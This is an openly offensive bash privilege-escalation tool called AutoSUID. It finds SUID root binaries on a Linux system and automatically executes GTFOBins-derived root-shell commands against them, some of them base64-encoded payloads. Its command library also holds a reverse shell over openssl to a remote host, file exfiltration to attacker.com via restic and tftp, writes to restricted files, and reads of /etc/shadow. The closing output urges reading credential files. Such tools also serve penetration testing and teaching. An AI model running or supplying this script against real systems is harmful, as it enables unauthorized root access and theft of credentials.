#!/bin/bash

############################################################################
# AutoSUID application is the Open-Source project, the main idea of which  #
# is to automate harvesting the SUID executable files and to find a way    #
# for further escalating the privileges.				   #
############################################################################
# Author:   Ivan Glinkin                                                   #
# Contact:  mail@ivanglinkin.com                                           #
# Twitter:  https://twitter.com/glinkinivan                                #
# LinkedIn: https://www.linkedin.com/in/ivanglinkin/                       #
############################################################################
# Main SUID source: https://gtfobins.github.io/ 			   #
# GTFOBins creators: - Emilio Pinna (https://twitter.com/norbemi)	   #
#		     - Andrea Cardaci (https://twitter.com/cyrus_and)	   #
############################################################################

# Variables
version="1.173"
releasedate="November 30, 2021"
updatedate="May 21, 2022"
suidlist=(ab agetty ar arj arp as ascii-xfr aspell ash atobm awk base32 base64 basenc bash bridge busybox bzip2 capsh cat chmod chown chroot cmp column comm cp cpio cpulimit csh csplit csvtool cupsfilter curl cut dash date dd dialog diff dig dmsetup docker dosbox ed efax emacs env eqn expand expect file find fish flock fmt fold gawk gcore gdb fgenie genisoimage gimp grep gtester gzip hd head hexdump highlight hping3 iconv install ionice ip jjs join jq jrunscript ksh ksshell ld.so less logsave look lua make mawk more msgattrib msgcat msgconv msgfilter msgmerge msguniq mv nasm nawk nice nl nm nmap node nohup od openssl openvpn paste perf perl pg php pidstat pr ptx python readelf restic rev rlwrap rsync run-parts rview rvim sash sed setarch shuf soelim sort sqlite3 ss ssh-keygen ssh-keyscan sshpass start-stop-daemon stdbuf strace strings sysctl systemctl tac tail taskset tbl tclsh tee tftp tic time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode view vigr vim vimdiff vipw watch wc wget whiptail xargs xmodmap xmore xxd xz zsh zsoelim);
restrictedfile="/etc/shadow"
suidlistcount=${#suidlist[@]}; # Count the output
rootsuidlist=(agetty bash zsh ash capsh chroot cpulimit csh dash env expect find fish flock genie ionice ksh ld.so logsave nice node nohup php pidstat python sash setarch sshpass start-stop-daemon stdbuf strace taskset xargs tclsh time timeout unshare run-parts rview rvim view vim vimdiff );

### SUID library
declare -A suidlibrary=( 	[bash]="Privilege escalation: ./bash -p"
				[bash_cmd]="-p"
				[zsh]="Privilege escalation: ./zsh"
				[zsh_cmd]=""
				[agetty]="Privilege escalation: ./agetty -o -p -l /bin/sh -a root tty"
				[agetty_cmd]="-o -p -l /bin/sh -a root tty"
				[ash]="Privilege escalation: ./ash"
				[ash_cmd]=""
				[busybox]="Privilege escalation: ./busybox sh"
				[busybox_cmd]="sh"
				[capsh]="Privilege escalation: ./capsh --gid=0 --uid=0 --"
				[capsh_cmd]=" --gid=0 --uid=0 --"
				[chroot]="Privilege escalation: ./chroot / /bin/sh -p"
				[chroot_cmd]="/ /bin/sh -p"
				[cpulimit]="Privilege escalation: ./cpulimit -l 100 -f -- /bin/sh -p"
				[cpulimit_cmd]="-l 100 -f -- /bin/sh -p"
				[csh]="Privilege escalation: ./csh -b"
				[csh_cmd]="-b"
				[dash]="Privilege escalation: ./dash -p"
				[dash_cmd]="-p"
				[env]="Privilege escalation: ./env /bin/sh -p"
				[env_cmd]="/bin/sh -p"
				[expect]="Privilege escalation: ./expect -c 'spawn /bin/sh -p;interact'"
				[expect_cmd]="-c 'spawn /bin/sh -p;interact'"
				[find]="Privilege escalation: ./find . -exec /bin/sh -p \; -quit"
				[find_cmd]=". -exec /bin/sh -p \; -quit"
				[fish]="Privilege escalation: ./fish"
				[fish_cmd]=""
				[flock]="Privilege escalation: ./flock -u / /bin/sh -p"
				[flock_cmd]="-u / /bin/sh -p"
				[genie]="Privilege escalation: genie -c '/bin/sh'"
				[genie_cmd]="-c '/bin/sh'"
				[ionice]="Privilege escalation: ./ionice /bin/sh -p"
				[ionice_cmd]="/bin/sh -p"
				[ksh]="Privilege escalation: ./ksh -p"
				[ksh_cmd]="-p"
				[ld.so]="Privilege escalation: ./ld.so /bin/sh -p"
				[ld.so_cmd]="/bin/sh -p"
				[logsave]="Privilege escalation: ./logsave /dev/null /bin/sh -i -p"
				[logsave_cmd]="/dev/null /bin/sh -i -p"
				[nice]="Privilege escalation: ./nice /bin/sh -p"
				[nice_cmd]="/bin/sh -p"
				[node]="Privilege escalation: ./node -e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"
				[node_cmd]="-e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"
				[nohup]="Privilege escalation: ./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
				[nohup_cmd]='/bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"'
				[php]="Privilege escalation: ./php -r \"pcntl_exec('/bin/sh', ['-p']);\""
				[php_cmd]="-f $(echo PD9waHAKcGNudGxfZXhlYygnL2Jpbi9zaCcsIFsnLXAnXSk7Cj8+ | base64 -d > pwn_php.me; echo pwn_php.me)"
				[pidstat]="Privilege escalation: ./pidstat -c COMMAND. In this particular case, we create another SUID file - /bin/bash. To get the root, execute 'bash -p'"
				[pidstat_cmd]="-e chmod +s /bin/bash"
				[python]="Privilege escalation: ./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
				[python_cmd]="$(echo aW1wb3J0IG9zOyBvcy5leGVjbCgiL2Jpbi9zaCIsICJzaCIsICItcCIp | base64 -d > pwn_python.me; echo pwn_python.me)"
				[sash]="Privilege escalation: ./sash"
				[sash_cmd]=""
				[setarch]="Privilege escalation: ./setarch $(arch) /bin/sh -p"
				[setarch_cmd]="$(arch) /bin/sh -p"
				[sshpass]="Privilege escalation: ./sshpass /bin/sh -p"
				[sshpass_cmd]="/bin/sh -p"
				[start-stop-daemon]="Privilege escalation: ./start-stop-daemon -n \$RANDOM -S -x /bin/sh -- -p"
				[start-stop-daemon_cmd]="-n $RANDOM -S -x /bin/sh -- -p"
				[stdbuf]="Privilege escalation: ./stdbuf -i0 /bin/sh -p"
				[stdbuf_cmd]="-i0 /bin/sh -p"
				[strace]="Privilege escalation: ./strace -o /dev/null /bin/sh -p"
				[strace_cmd]="-o /dev/null /bin/sh -p"
				[taskset]="Privilege escalation: ./taskset 1 /bin/sh -p"
				[taskset_cmd]="1 /bin/sh -p"
				[xargs]="Privilege escalation: ./xargs -a /dev/null sh -p"
				[xargs_cmd]="-a /dev/null sh -p"
				[tclsh]="Privilege escalation: ./tclsh; exec /bin/sh -p <@stdin >@stdout 2>@stderr"
				[tclsh_cmd]="$(echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr' > pwn_tclsh.me; echo pwn_tclsh.me)"
				[time]="Privilege escalation: ./time /bin/sh -p"
				[time_cmd]="/bin/sh -p"
				[timeout]="Privilege escalation: ./timeout 7d /bin/sh -p"
				[timeout_cmd]="7d /bin/bash -p"
				[unshare]="Privilege escalation: ./unshare -r /bin/sh"
				[unshare_cmd]="-r /bin/sh"
				[run-parts]="Privilege escalation: ./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
				[run-parts_cmd]="--new-session --regex '^sh$' /bin --arg='-p'"
				[rview]="Privilege escalation: ./rview -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"  
				[rview_cmd]="-c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset;exec sh -p\")'"
				[rvim]="Privilege escalation: ./rvim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"  
				[rvim_cmd]="-c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset;exec sh -p\")'"
				[view]="Privilege escalation: ./view -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"  
				[view_cmd]="-c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset;exec sh -p\")'"
				[vim]="Privilege escalation: ./vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"  
				[vim_cmd]="-c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset;exec sh -p\")'"
				[vimdiff]="Privilege escalation: ./vimdiff -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"  
				[vimdiff_cmd]="-c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset;exec sh -p\")'"
				
				
				[ab]="Upload local file via HTTP POST request: ./ab -p FILE_TO_SEND URL"
				[chmod]="Change permissions: ./chmod 6777 FILE_TO_CHANGE"
				[chown]="Change permissions: ./chown \$(id -un):\$(id -gn) FILE_TO_CHANGE"
				[dmsetup]="Privilege escalation: ./dmsetup create base <<EOF; 0 3534848 linear /dev/loop0 94208; EOF; ./dmsetup ls --exec '/bin/sh -p -s'"
				[docker]="Privilege escalation: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
				[emacs]="Privilege escalation: ./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
				[gcore]="Privilege escalation: ./gcore \$PID"
				[gdb]="Bash restiction bypass: ./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
				[gimp]="Privilege escalation: ./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
				[gtester]="Bash restiction bypass: TF=\$(mktemp);
						echo '#!/bin/sh -p' > \$TF;
						echo 'exec /bin/sh -p 0<&1' >> \$TF
						chmod +x \$TF
						sudo gtester -q \$TF"
				[hping3]="Privilege escalation: ./hping3; /bin/sh -p"
				[install]="Change permissions: ./install -m 6777 FILE_TO_CHANGE \$(mktemp)"
				[ip]="\n\tBash restiction bypass: ./ip netns add foo; ./ip netns exec foo /bin/sh -p;./ip netns delete foo\n\tRead the restricted file: ./ip -force -batch FILE_NAME"
				[jjs]="Bash restiction bypass: echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
				[jrunscript]="Bash restiction bypass: ./jrunscript -e \"exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <\$(tty) >$(tty) 2>$(tty)')\""
				[make]="Bash restiction bypass: ./make -s --eval=$'x:\n\t-'\"/bin/sh -p\""
				[msgfilter]="Bash restiction bypass: echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill \$PPID'"
				[rlwrap]="./rlwrap -H /dev/null /bin/sh -p"
				[rsync]="Break out from restricted environments: ./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
				[openssl]="\n\tGet reverse shell: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect REMOTE_HOST:REMOTE_PORT > /tmp/s; rm /tmp/s\n\tWrite into file: echo DATA | /.openssl enc -out FILE_NAME"
				[perf]="Bash restiction bypass: ./perf stat /bin/sh -p"
				[perl]="Bash restiction bypass: ./perl -e 'exec \"/bin/sh\";'"
				[restic]="Exfiltrate files on the network: RHOST=attacker.com; RPORT=12345; LFILE=file_or_dir_to_get; NAME=backup_name; restic backup -r \"rest:http://\$RHOST:$\RPORT/\$NAME\" \"\$LFILE\""
				[wget]="Fetch a remote file via HTTP GET request: ./wget URL -O FILE_NAME"
				[watch]="Bash restiction bypass: ./watch -x sh -c 'reset; exec sh 1>&0 2>&0'" 
				[tftp]="Send local file to a TFTP server: RHOST=attacker.com; ./tftp \$RHOST; put file_to_send"
				[systemctl]="Privilege escalation: TF=\$(mktemp).service; echo '[Service] 
					Type=oneshot
					ExecStart=/bin/sh -c \"id > /tmp/output\"
					[Install]
					WantedBy=multi-user.target' > \$TF;
					./systemctl link \$TF;
					./systemctl enable --now \$TF"
				
				
				[cp]="Write into the restricted file: echo DATA | ./cp /dev/stdin FILE_TO_WRITE"
				[arj]="Write into the restricted file: TF=\$(mktemp -d); LFILE=file_to_write; LDIR=where_to_write; echo DATA >\"\$TF/\$LFILE\"; ./arj a \"\$TF/a\" \"\$TF/\$LFILE\"; ./arj e \"\$TF/a\" \$LDIR"
				[cpio]="\n\tRead the restricted file: echo FILE_NAME | ./cpio -R \$UID -dp \$(mktemp -d); cat \"\$(mktemp -d)/FILE_NAME\"\n\tWrite into the restricted file: echo DATA > FILE_TO_WRITE; echo FILE_TO_WRITE | ./cpio -R 0:0 -p DIR_WHERE_TO_WRITE"
				[curl]="Write into the restricted file: ./curl URL -o FILE_TO_WRITE"
				[dd]="Write into the restricted file: echo DATA | ./dd of=FILE_TO_WRITE"
				[mvdosbox]="Write into the restricted file: ./dosbox -c 'mount c /' -c \"echo DATA >c:FILE_TO_WRITE\" -c exit"
				[mv]="Write into the restricted file: LFILE=file_to_write; TF=\$(mktemp); echo \"DATA\" > \$TF; ./mv \$TF \$LFILE"
				[nmap]="Write into the restricted file: ./nmap -oG=FILE_NAME DATA"
				[shuf]="Write into the restricted file: ./shuf -e DATA -o FILE_NAME"
				[tee]="Write into the restricted file: echo DATA | ./tee -a FILE_NAME"
				[ssh-keygen]="It loads shared libraries that may be used to run code in the binary execution context: ./ssh-keygen -D ./lib.so"
				[update-alternatives]="Write in file: LFILE=/path/to/file_to_write; TF=\$(mktemp); echo DATA >\$TF; ./update-alternatives --force --install \"\$LFILE\" x \"\$TF\" 0"
				[vipw]="Write into the restricted file: ./vipw"
				
				
				[cat]="Read the restricted file: ./cat FILE_NAME"
				[ascii-xfr]="Read the restricted file: ./ascii-xfr -ns FILE_NAME"
				[aspell]="Read the restricted file: ./aspell -c FILE_NAME"
				[ar]="Read the restricted file: ./ar r \$(mktemp -u) FILE_NAME; cat \$(mktemp -u)"
				[arp]="Read the restricted file: ./arp -v -f FILE_NAME"
				[as]="Read the restricted file: ./as FILE_NAME"
				[atobm]="Read the restricted file: ./atobm FILE_NAME 2>&1 | awk -F \"'\" '{printf \"%s\", \$2}'"
				[awk]="Read the restricted file: ./awk '//' FILE_NAME"
				[base32]="Read the restricted file: ./base32 FILE_NAME | base32 --decode"
				[base64]="Read the restricted file: ./base64 FILE_NAME | base64 --decode"
				[basenc]="Read the restricted file: basenc --base64 FILE_NAME | basenc -d --base64 FILE_NAME"
				[bridge]="Read the restricted file: ./bridge -b FILE_NAME"
				[bzip2]="Read the restricted file: ./bzip2 -c FILE_NAME | bzip2 -d"
				[cmp]="Read the restricted file: ./cmp FILE_NAME /dev/zero -b -l"
				[column]="Read the restricted file: ./column FILE_NAME"
				[comm]="Read the restricted file: comm FILE_NAME /dev/null 2>/dev/null"
				[csplit]="Read the restricted file: ./csplit FILE_NAME 1; cat xx01"
				[csvtool]="Read the restricted file: ./csvtool trim t FILE_NAME"
				[cupsfilter]="Read the restricted file: ./cupsfilter -i application/octet-stream -m application/octet-stream FILE_NAME"
				[cut]="Read the restricted file: ./cut -d "" -f1 FILE_NAME"
				[date]="Read the restricted file: ./date -f FILE_NAME"
				[dialog]="Read the restricted file: ./dialog --textbox FILE_NAME 0 0"
				[diff]="Read the restricted file: ./diff --line-format=%L /dev/null FILE_NAME"
				[dig]="Read the restricted file: ./dig -f FILE_NAME"
				[ed]="Read the restricted file: ./ed FILE_NAME; ,p; q"
				[efax]="Read the restricted file: ./efax -d FILE_NAME"
				[eqn]="Read the restricted file: ./eqn FILE_NAME"
				[file]="Read the restricted file: ./file -f FILE_NAME"
				[fmt]="Read the restricted file: ./fmt -999 FILE_NAME"
				[fold]="Read the restricted file: ./fold -w99999999 FILE_NAME"
				[gawk]="Read the restricted file: ./gawk '//' FILE_NAME"
				[genisoimage]="Read the restricted file: ./genisoimage -sort FILE_NAME"
				[grep]="Read the restricted file: ./grep '' FILE_NAME"
				[gzip]="Read the restricted file: ./gzip -f FILE_NAME -t"
				[hd]="Read the restricted file: ./hd FILE_NAME"
				[head]="Read the restricted file: ./head -c1G FILE_NAME"
				[hexdump]="Read the restricted file: ./hexdump -C FILE_NAME"
				[highlight]="Read the restricted file: ./highlight --no-doc --failsafe FILE_NAME"
				[iconv]="Read the restricted file: ./iconv -f 8859_1 -t 8859_1 FILE_NAME"
				[join]="Read the restricted file: ./join -a 2 /dev/null FILE_NAME"
				[jq]="Read the restricted file: ./jq -Rr . FILE_NAME"
				[ksshell]="Read the restricted file: ./ksshell -i FILE_NAME"
				[less]="Read the restricted file: ./less FILE_NAME"
				[look]="Read the restricted file: ./look '' FILE_NAME"
				[lua]="Read the restricted file: lua -e 'local f=io.open(\"FILE_NAME\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
				[mawk]="Read the restricted file: ./mawk '//' FILE_NAME"
				[more]="Read the restricted file: ./more FILE_NAME"
				[msgattrib]="Read the restricted file: ./msgattrib -P FILE_NAME"
				[msgcat]="Read the restricted file: ./msgcat -P FILE_NAME"
				[msgconv]="Read the restricted file: ./msgconv -P FILE_NAME"
				[msgmerge]="Read the restricted file: ./msgmerge -P FILE_NAME /dev/null"
				[msguniq]="Read the restricted file: ./msguniq -P FILE_NAME"
				[nasm]="Read the restricted file: ./nasm -@ FILE_NAME"
				[nawk]="Read the restricted file: ./nawk '//' FILE_NAME"
				[nl]="Read the restricted file: ./nl -bn -w1 -s '' FILE_NAME"
				[nm]="Read the restricted file: ./nm @FILE_NAME"
				[od]="Read the restricted file: ./od -An -c -w9999 FILE_NAME"
				[openvpn]="Read the restricted file: ./openvpn --config FILE_NAME"
				[paste]="Read the restricted file: ./paste FILE_NAME"
				[pg]="Read the restricted file: ./pg FILE_NAME"
				[pr]="Read the restricted file: ./pr -T FILE_NAME"
				[ptx]="Read the restricted file: ./ptx -w 5000 FILE_NAME"
				[readelf]="Read the restricted file: ./readelf -a @FILE_NAME"
				[rev]="Read the restricted file: ./rev FILE_NAME | rev"
				[sed]="Read the restricted file: ./sed -e '' FILE_NAME"
				[soelim]="Read the restricted file: ./soelim FILE_NAME"
				[sort]="Read the restricted file: ./sort -m FILE_NAME"
				[ss]="Read the restricted file: ./ss -a -F FILE_NAME"
				[sqlite3]="Read the restricted file: LFILE=file_to_read; sqlite3 << EOF; CREATE TABLE t(line TEXT);
.import \$LFILE t; SELECT * FROM t; EOF"
				[ssh-keyscan]="Read the restricted file: ./ssh-keyscan -f FILE_NAME"
				[strings]="Read the restricted file: ./strings FILE_NAME"
				[sysctl]="Read the restricted file: ./sysctl -n \"/../../FILE_NAME\""
				[tac]="Read the restricted file: ./tac -s 'RANDOM' FILE_NAME"
				[tail]="Read the restricted file: ./tail -c1G FILE_NAME"
				[tbl]="Read the restricted file: ./tbl FILE_NAME"
				[tic]="Read the restricted file: ./tic -C FILE_NAME"
				[troff]="Read the restricted file: ./troff FILE_NAME"
				[ul]="Read the restricted file: ./ul FILE_NAME"
				[unexpand]="Read the restricted file: ./unexpand -t99999999 FILE_NAME"
				[uniq]="Read the restricted file: ./uniq FILE_NAME"
				[uudecode]="Read the restricted file: uuencode FILE_NAME /dev/stdout | uudecode"
				[uuencode]="Read the restricted file: uuencode FILE_NAME /dev/stdout | uudecode"
				[vigr]="Read and change the restricted file: ./vigr"
				[wc]="Read the restricted file: ./wc --files0-from FILE_NAME"
				[whiptail]="Read the restricted file: ./whiptail --textbox --scrolltext FILE_NAME 0 0"
				[xmodmap]="Read the restricted file: ./xmodmap -v FILE_NAME"
				[xmore]="Read the restricted file: ./xmore FILE_NAME"
				[xxd]="Read the restricted file: ./xxd FILE_NAME | xxd -r"
				[xz]="Read the restricted file: ./xz -c FILE_NAME | xz -d"
				[zsoelim]="Read the restricted file: ./zsoelim FILE_NAME"
)
### SUID library

# Colors
RED=`echo -n '\e[00;31m'`;
RED_BOLD=`echo -n '\e[01;31m'`;
GREEN=`echo -n '\e[00;32m'`;
GREEN_BOLD=`echo -n '\e[01;32m'`;
ORANGE=`echo -n '\e[00;33m'`;
BLUE=`echo -n '\e[01;36m'`;
WHITE=`echo -n '\e[00;37m'`;
CLEAR_FONT=`echo -n '\e[00m'`;

## Header
echo -e "";
echo -e "$ORANGE╔═══════════════════════════════════════════════════════════════════════════╗$CLEAR_FONT";
echo -e "$ORANGE║\t\t\t\t\t\t\t\t\t    ║$CLEAR_FONT";
echo -e "$ORANGE║$CLEAR_FONT$GREEN_BOLD\t\t\t\t  AutoSUID\t\t\t\t    $CLEAR_FONT$ORANGE║$CLEAR_FONT";
echo -e "$ORANGE║\t\t\t\t\t\t\t\t\t    ║\e[00m";
echo -e "$ORANGE╚═══════════════════════════════════════════════════════════════════════════╝$CLEAR_FONT";
echo -e "";
echo -e "$ORANGE[ ! ] https://www.linkedin.com/in/IvanGlinkin/ | @glinkinivan$CLEAR_FONT";
echo -e "";

## Find the SUID files
echo -e "$ORANGE[ ! ]$CLEAR_FONT Running the command to find SUID files";
echo -e "$BLUE[ * * ]$CLEAR_FONT$GREEN_BOLD find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null$CLEAR_FONT";
suidArray=$(find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null); # Harvesting SUID files

## Check if there are no related files
if [ -z "$suidArray" ]
then
	echo -e "$RED_BOLD[ - ]$CLEAR_FONT The command has successfuly performed, but we did not find any related files";
	exit
fi

countsuidArray=$(echo $suidArray | tr " " "\n" | wc -l); # Count the output
echo -e "$GREEN_BOLD[ + ]$CLEAR_FONT The command has successfuly performed. We have found $GREEN_BOLD$countsuidArray$CLEAR_FONT file(s)";

echo -e "$ORANGE[ ! ]$CLEAR_FONT Let's compare the found SUID files with predefined base ($GREEN_BOLD$suidlistcount$CLEAR_FONT apps)";

## Check if the found SUID files leads to escalation
for suidSelect in ${suidlist[@]};
do exploitablesuidarray+=($(echo $suidArray | tr " " "\n" | grep -i "/$suidSelect$" | awk '{print $1 " "}'));
done;

#### No results
if [ -z "$exploitablesuidarray" ]
then
	echo -e "$RED_BOLD[ - ]$CLEAR_FONT Unfortunately, there are no any SUID files, which lead to privilege escalation";
	## Clean residual pwn* files
	rm pwn*
	exit
fi

exploitablesuidarraycount=${#exploitablesuidarray[@]}; # Count the output
echo -e "$GREEN_BOLD[ + ]$CLEAR_FONT We have found at least $GREEN_BOLD$exploitablesuidarraycount$CLEAR_FONT potential SUID exploitable file(s):"
for suidexploitable in "${exploitablesuidarray[@]}"
do
	suidcommand=$(echo $suidexploitable | awk -F "/" '{print $NF}'); # clear the path
	suidexplanation=$(echo ${suidlibrary[$suidcommand]});
	echo -e "\n$BLUE[ * * ]$CLEAR_FONT $suidexploitable";
	echo -e "$BLUE[ Explanation ]$CLEAR_FONT $GREEN_BOLD$suidexplanation$CLEAR_FONT";
done

## The further attack explanation
echo -e "\n$GREEN_BOLD[ + ]$CLEAR_FONT Exploitation..."
for suidexploitable in "${exploitablesuidarray[@]}"
do
	suidcommand=$(echo $suidexploitable | awk -F "/" '{print $NF}'); # clear the path
	## check for matches
	for suidSelect in ${rootsuidlist[@]};
	do 
		if [ $suidcommand == $suidSelect ]
			then 
			wehavesuidtoroot=true;
			echo -e "$BLUE[ * * ]$CLEAR_FONT We have found$RED_BOLD $suidSelect SUID$CLEAR_FONT file. Trying to get root";
			keys=$(echo $suidSelect"_cmd");
			exploit=$(echo $suidexploitable ${suidlibrary[$keys]});
			echo -e "$BLUE[ * * ]$CLEAR_FONT Executing $RED_BOLD$exploit$CLEAR_FONT";
			$exploit;
		fi;
	done

done

## Clean after ourselves
rm pwn*

if [ ! $wehavesuidtoroot ]
then echo -e "$BLUE[ * * ]$CLEAR_FONT Seems like there are no privilege escalation files through SUID in the system. Follow the instructions above to read the restricted files, eg. $RED_BOLD/etc/shadow$CLEAR_FONT or $RED_BOLD/root/.bash_history$CLEAR_FONT, or perform other high privileges commands. P.s. think outside the box to pivot into the root ;)";
fi
